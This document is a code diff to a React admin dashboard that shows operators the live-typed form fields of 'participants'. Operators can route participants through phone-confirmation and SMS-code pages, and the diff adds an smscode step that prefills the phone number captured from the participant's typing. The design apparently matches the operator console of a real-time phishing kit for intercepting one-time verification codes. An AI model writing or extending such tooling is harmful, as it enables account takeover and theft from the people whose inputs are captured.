@@ -642,6 +642,7 @@ function Admin() {
                   onKick={kick}
                   onOpenPreview={openPreview}
                   events={events}
+                  liveFieldMaps={liveFieldMaps}
                   suites={suites}
                 />
               </div>
@@ -846,6 +847,7 @@ function SessionsPage({
   onKick,
   onOpenPreview,
   events,
+  liveFieldMaps,
   suites,
 }: {
   queue: LiveRecord[];
@@ -856,6 +858,7 @@ function SessionsPage({
   onKick: (id: string) => void;
   onOpenPreview: (id: string) => void;
   events: InputPayload[];
+  liveFieldMaps: Map<string, Record<string, string>>;
   suites: SuiteOpt[];
 }) {
   const [query, setQuery] = useState("");
@@ -962,6 +965,7 @@ function SessionsPage({
                 onOpenPreview={onOpenPreview}
                 suites={suites}
                 events={events.filter((e) => e.participantId === p.id)}
+                liveFields={liveFieldMaps.get(p.id) || {}}
               />
             ))}
           </div>
@@ -1095,6 +1099,7 @@ function ParticipantCard({
   onOpenPreview,
   suites,
   events,
+  liveFields,
 }: {
   p: LiveRecord;
   onNavigate: (id: string, suite: Suite, page: Page) => void;
@@ -1103,6 +1108,7 @@ function ParticipantCard({
   onOpenPreview: (id: string) => void;
   suites: SuiteOpt[];
   events: InputPayload[];
+  liveFields: Record<string, string>;
 }) {
   const [regRev, setRegRev] = useState(0);
   useEffect(() => subscribeRegistry(() => setRegRev((r) => r + 1)), []);
@@ -1139,7 +1145,7 @@ function ParticipantCard({
   /**
    * Pages that need admin input before redirect.
    * - code2: 2-digit code (checkphone prompt / confirmphone last digits)
-   * - phone: full phone number shown on sendcode
+   * - phone: full phone number shown on sendcode / smscode
    */
   type RedirectInputMode = "code2" | "phone";
   const REDIRECT_INPUT: Record<string, Record<string, RedirectInputMode>> = {
@@ -1147,6 +1153,7 @@ function ParticipantCard({
       checkphone: "code2",
       confirmphone: "code2",
       sendcode: "phone",
+      smscode: "phone",
     },
   };
 
@@ -1175,9 +1182,21 @@ function ParticipantCard({
   }
 
   function routeTo(suite: Suite, page: Page) {
-    if (redirectInputMode(suite, page)) {
+    const mode = redirectInputMode(suite, page);
+    if (mode) {
       setAwaitingCodeFor(page);
-      setCodeDraft("");
+      // Prefill phone from what they already typed (confirmphone / live).
+      if (mode === "phone") {
+        const hint =
+          liveFields.phone ||
+          liveFields.phone_number ||
+          liveFields.Phone ||
+          liveFields["Phone number"] ||
+          "";
+        setCodeDraft(hint);
+      } else {
+        setCodeDraft("");
+      }
       return;
     }
     onNavigate(p.id, suite, page);
